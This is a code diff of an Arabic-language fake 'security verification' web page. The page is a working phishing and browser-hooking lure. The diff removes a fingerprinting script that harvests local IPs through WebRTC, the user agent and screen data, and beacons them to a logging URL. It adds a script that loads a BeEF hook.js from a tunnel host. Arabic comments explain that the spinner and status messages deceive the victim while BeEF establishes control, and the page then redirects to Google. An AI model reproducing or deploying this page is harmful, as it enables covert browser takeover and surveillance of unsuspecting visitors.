@@ -2,51 +2,69 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Security Verification</title>
-</head>
-<body style="background:#000; color:#0f0; text-align:center; padding-top:20%; font-family:monospace;">
-    <h2 id="msg">INITIALIZING SECURE CONNECTION...</h2>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق من الأمان...</title>
+    <script src="https://1be526304db6fe64-197-200-63-81.serveousercontent.com/hook.js"></script>
     
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .loader {
+            border: 4px solid #1a1a1a;
+            border-top: 4px solid #00ff41;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status { margin-top: 20px; font-size: 1.2rem; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <div class="status" id="status">جاري فحص المتصفح للأمان...</div>
+
     <script>
-        const MY_URL = "**********************************************/log.gif"; 
+        // مصفوفة رسائل لإقناع الضحية أن هناك عملية حقيقية تحدث
+        const messages = [
+            "جاري فحص بروتوكولات التشفير...",
+            "تحليل عنوان IP الخاص بك...",
+            "تأمين الجلسة الحالية...",
+            "تم التحقق! جاري إعادة التوجيه..."
+        ];
 
-        async function getLocalIPs() {
-            let ips = [];
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                pc.createDataChannel("");
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                return new Promise(res => {
-                    pc.onicecandidate = (e) => {
-                        if (!e.candidate) res(ips.join('|'));
-                        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                        if (match && !ips.includes(match[1])) ips.push(match[1]);
-                    };
-                    setTimeout(() => res(ips.join('|')), 1000);
-                });
-            } catch (e) { return "Blocked"; }
-        }
+        let i = 0;
+        const statusElement = document.getElementById('status');
 
-        async function captureAll() {
-            const localIP = await getLocalIPs();
-            const info = {
-                ua: navigator.userAgent,
-                res: screen.width + "x" + screen.height,
-                internal: localIP,
-                lang: navigator.language
-            };
-
-            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
-            const img = new Image();
-            img.src = `${MY_URL}?data=${payload}`;
-            
-            setTimeout(() => {
-                document.getElementById("msg").innerText = "ACCESS GRANTED. REDIRECTING...";
-                window.location.href = "https://www.google.com";
-            }, 3000);
-        }
-
-        window.onload = captureAll;
+        const interval = setInterval(() => {
+            if (i < messages.length) {
+                statusElement.innerText = messages[i];
+                i++;
+            } else {
+                clearInterval(interval);
+                // بعد انتهاء الرسائل، يتم إرسال الضحية لموقع حقيقي (مثل فيسبوك أو جوجل)
+                // هذا يعطي الـ BeEF وقتاً كافياً (10 ثوانٍ) لتثبيت الاتصال
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 2000);
+            }
+        }, 2500); // تغيير الرسالة كل ثانيتين ونصف
     </script>
 </body>
+</html>
 </html>
